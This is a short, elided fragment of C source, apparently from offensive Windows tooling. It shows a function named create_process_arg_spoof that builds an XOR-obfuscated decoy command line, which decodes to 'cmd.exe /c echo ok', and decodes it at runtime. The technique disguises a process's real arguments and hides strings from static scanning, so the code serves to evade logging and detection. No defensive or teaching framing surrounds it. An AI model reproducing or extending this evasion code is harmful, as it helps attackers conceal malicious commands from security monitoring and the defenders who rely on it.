...
static BOOL create_process_arg_spoof(const char *realCmd,
    ...
    WCHAR wFake[] = {0x63^0x4B,0x6D^0x4B,0x64^0x4B,0x2E^0x4B,0x65^0x4B,
                     0x78^0x4B,0x65^0x4B,0x20^0x4B,0x2F^0x4B,0x63^0x4B,
                     0x20^0x4B,0x65^0x4B,0x63^0x4B,0x68^0x4B,0x6F^0x4B,
                     0x20^0x4B,0x6F^0x4B,0x6B^0x4B,0x00};
    for (int _i = 0; wFake[_i]; _i++) wFake[_i] ^= 0x4B;
